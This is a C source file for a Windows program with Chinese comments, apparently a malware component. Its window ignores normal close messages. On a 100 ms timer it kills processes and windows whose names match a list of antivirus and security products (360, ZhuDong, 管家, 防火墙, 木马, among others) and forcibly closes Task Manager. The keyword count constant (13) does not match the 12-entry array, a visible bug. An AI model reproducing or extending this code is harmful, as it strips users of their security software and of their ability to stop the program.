#include "common.h"
#define K_SAFE 1
#define KEY_WORD_NUM 13
const WCHAR* KeyWord[] = { L"ZhuDong",L"兔子",L"任务",L"优化",L"注册表",L"进程",L"毒",L"木马",L"天网",L"防火墙" ,L"360",L"管家" };
#pragma comment(lib,"Shlwapi.lib")

// 必须要进行前导声明  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
);


// 程序入口点  
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
)
{
#if INFO
	AllocConsole();
#endif
	WinInit((const wchar_t*)lpCmdLine, hInstance, WindowProc);
	// 消息循环 
#if INFO
	freopen("CONOUT$", "w", stdout);
	printf("INFO:消息循环开始\n");
#endif
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
#if INFO
	FreeConsole();
#endif
	return 0;
}
// 在WinMain后实现  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
)
{
	switch (uMsg)
	{
	//防止常规关闭
	case WM_DESTROY:
		break;
	case WM_CLOSE:
		break;
	case WM_CREATE:
		SetTimer(hwnd, 1, 100, NULL);
		SetTimer(hwnd, 2, 300000, NULL);
		break;
	case WM_TIMER:
	{
		if (wParam == 1)
		{
			if (K_SAFE)
			{
#if INFO
				//转换为char
				//char buf[1024];
				//WideCharToMultiByte(CP_ACP, 0, lujing, -1, buf, sizeof(buf), NULL, NULL);
				freopen("CONOUT$", "w", stdout);
				printf("INFO:关闭杀毒软件\n");
#endif
				KillSoftWareByWindow(KeyWord, KEY_WORD_NUM);
				KillSoftWareByProcess(KeyWord, KEY_WORD_NUM);
				
				//通过检查窗口标题 “windows 任务管理器”,检查是否有windows任务管理器打开了
				//关闭任务管理器
				if (FindWindow(NULL, TEXT("Windows 任务管理器")) != NULL)
					PostMessage(FindWindow(NULL, TEXT("Windows 任务管理器")), WM_DESTROY, 0, 0);
			}	
		}
		
		break;
	}
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
		break;
	}
	
}

